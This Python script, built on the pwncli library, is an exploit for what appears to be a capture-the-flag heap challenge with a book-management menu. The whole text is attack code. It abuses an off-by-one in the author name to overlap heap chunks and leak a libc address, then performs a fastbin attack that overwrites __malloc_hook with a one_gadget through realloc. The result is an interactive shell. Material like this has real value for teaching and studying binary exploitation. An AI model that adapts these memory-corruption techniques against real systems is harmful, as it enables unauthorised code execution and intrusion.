from pwncli import *

cli_script()

p = gift['io']
elf = gift['elf']
libc = gift['libc']


def author_name(name="lynne"):
    p.sendlineafter("Enter author name: ", name)


def create(name_size, name, desc_size, desc):
    p.sendlineafter("> ", "1")
    p.sendlineafter("\nEnter book name size: ", str(name_size))
    p.sendafter("Enter book name (Max 32 chars): ", name)
    p.sendlineafter("\nEnter book description size: ", str(desc_size))
    p.sendafter("Enter book description: ", desc)

def delete(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Enter the book id you want to delete: ", str(idx))


def edit(idx, desc):
    p.sendlineafter("> ", "3")
    p.sendlineafter("Enter the book id you want to edit: ", str(idx))
    p.sendlineafter("Enter new book description: ", desc)
    

def show():
    p.sendlineafter("> ", "4")
    return p.recvuntil("\n1. Create a book")


def change_name(name):
    p.sendlineafter("> ", "5")
    p.sendlineafter("Enter author name: ", name)


author_name()

create(0xc0, "a\n", 0x30, flat(0, 0x141, "\x01\n"))
create(0x60, "a\n", 0x60, "a\n")
change_name("a"*0x20)

delete(1)

create(0x20, "a\n", 0x60, "a\n")
msg = show()
idx = msg.index(b"\x7f") + 1

libc_base_addr = u64(msg[idx - 6:idx].ljust(8, b"\x00")) - 0x3c4b78
log_address("libc_base_addr", libc_base_addr)
libc.address = libc_base_addr

one_gadget = libc.offset_to_vaddr(0x4526a)
log_address("one_gadget", one_gadget)
stop()
delete(2)

edit(3, flat([[0] * 5, 0x71, libc.sym['__malloc_hook'] - 0x23, "\n"]))

create(0x60, "a\n", 0x60, "a\n")

p.sendlineafter("> ", "1")
p.sendlineafter("\nEnter book name size: ", str(0x60))
p.sendafter("Enter book name (Max 32 chars): ", flat(["a" * 11, one_gadget, libc.sym['realloc'] + 13, "\n"]))
p.sendlineafter("\nEnter book description size: ", str(0))

p.interactive()